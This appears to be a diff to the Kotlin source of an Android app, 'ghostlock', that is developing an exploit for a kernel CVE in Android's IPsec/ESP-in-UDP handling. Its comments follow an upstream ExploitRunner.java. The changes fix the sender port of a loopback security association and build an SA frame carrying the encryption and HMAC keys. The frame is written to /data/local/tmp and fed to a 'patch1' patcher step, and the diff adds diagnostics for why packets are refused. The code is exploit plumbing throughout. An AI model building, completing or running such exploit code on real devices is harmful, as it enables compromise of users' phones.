@@ -51,6 +51,8 @@ object TypedBackendProbe {
     @Volatile private var saEncapPort: Int = 4500
     @Volatile private var saAesKey: ByteArray? = null
     @Volatile private var saHmacKey: ByteArray? = null
+    /** 本次会话的 ESP 源端口：由一次真实 bind 取得（照上游：开 DatagramSocket → getLocalPort → close）。 */
+    @Volatile private var saSenderPort: Int = 0
 
     fun run(context: android.content.Context): List<String> {
         probeContext = context
@@ -138,6 +140,13 @@ object TypedBackendProbe {
             val encap = manager.openUdpEncapsulationSocket()
             val encapPort = encap.getPort()
             step("typed: ipsec sa encapPort=" + encapPort)
+            /* 照上游 ExploitRunner.java:71-74：先开一个普通 UDP 套接字、取它的本地端口、立刻关掉，
+             * 把这个**真实可用**的端口交给封装声明与我们自己的 ESP 套接字（写死端口会 bind 不上，
+             * 源端口被内核随机挑 ⇒ 与封装声明不一致 ⇒ 报文被 ICMP 拒绝，即我们见到的 ECONNREFUSED）。 */
+            val senderProbe = java.net.DatagramSocket()
+            saSenderPort = senderProbe.localPort
+            senderProbe.close()
+            step("typed: ipsec sa senderPort=" + saSenderPort)
             val loopback = java.net.InetAddress.getByName("127.0.0.1")
             val spiObj = manager.allocateSecurityParameterIndex(loopback)
             val spi = spiObj.getSpi()
@@ -158,14 +167,14 @@ object TypedBackendProbe {
                 .setAuthentication(
                     android.net.IpSecAlgorithm(android.net.IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128)  /* 128 bit = 16 字节，与帧的 icv_len 一致（96 会与 16 字节的 ICV 对不上） */,
                 )
-                .setIpv4Encapsulation(encap, 4500)
+                .setIpv4Encapsulation(encap, saSenderPort)
                 .buildTransportModeTransform(loopback, spiObj)
             step(
                 "typed: ipsec sa built transform=" + (transform != null) +
                     " retainedAesNonZero=" + (saAesKey?.count { byte -> byte != 0.toByte() } ?: -1) +
                     " retainedHmacNonZero=" + (saHmacKey?.count { byte -> byte != 0.toByte() } ?: -1),
             )
-            val frame = com.ghostlock.app.jni.cve43284.SaFrame.build(spi, encapPort, 4500, aesKey, hmacKey)
+            val frame = com.ghostlock.app.jni.cve43284.SaFrame.build(spi, encapPort, saSenderPort, aesKey, hmacKey)
             val written = com.ghostlock.app.jni.cve43284.SaFrame.writeTo(
                 "/data/local/tmp/ghostlock-sa.frame",
                 frame,
@@ -470,7 +479,7 @@ object TypedBackendProbe {
             encapPort = saEncapPort,
             /* 上游用**具体** senderPort（setIpv4Encapsulation(encapSock, senderPort)），ESP-in-UDP 的入站
              * 分流按端口匹配；给 0 让内核挑临时端口时，报文可能因端口对不上被丢。 */
-            senderPort = 4500,
+            senderPort = saSenderPort,
             icvLength = 16,
             /* 给 DTO 的是**副本**：native 读取器读完秘密字段会把它清零，若传同一数组会把我们留的字段也擦掉
              * （2026-10-15 真机实证：留存副本 32/32 非零，到写的时候却成了全零）。 */
@@ -655,6 +664,33 @@ object TypedBackendProbe {
             )
         }.onFailure { problem ->
             step("typed: encap state refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+        }
+
+        /* 判定①：Kotlin 直接往 encap 端口发一个普通 UDP 报文，看是否也被拒（把 native 与设备/网络分开）。 */
+        var directResult = "not-run"
+        val directThread = Thread {
+            directResult = try {
+                val loopback = java.net.InetAddress.getByName("127.0.0.1")
+                val probe = java.net.DatagramSocket()
+                /* 第一次探路（ICMP 之后才回来）；第二次的结果才是判定：被拒=该端口无接收方。 */
+                probe.send(java.net.DatagramPacket(ByteArray(1), 1, loopback, saEncapPort))
+                Thread.sleep(120)
+                probe.send(java.net.DatagramPacket(ByteArray(1), 1, loopback, saEncapPort))
+                probe.close()
+                "two-sends-both-ok"
+            } catch (problem: Exception) {
+                problem.javaClass.simpleName + ":" + (problem.message ?: "")
+            }
+        }
+        directThread.start()
+        directThread.join(2000)
+        step("typed: direct udp to encap port=" + saEncapPort + " => " + directResult)
+        /* 判定②：设备网络状态 —— 封装套接字建在默认网络上。 */
+        runCatching {
+            val cm = probeContext?.getSystemService(android.net.ConnectivityManager::class.java)
+            step("typed: network active=" + (cm?.activeNetwork != null))
+        }.onFailure { problem ->
+            step("typed: network refused " + problem.javaClass.simpleName)
         }
         step("typed: patch1 wrote=" + patchWrote + " refusal=" + patcher.lastRefusal +
             " helperBytes=" + (helperForPatch?.size ?: -1))
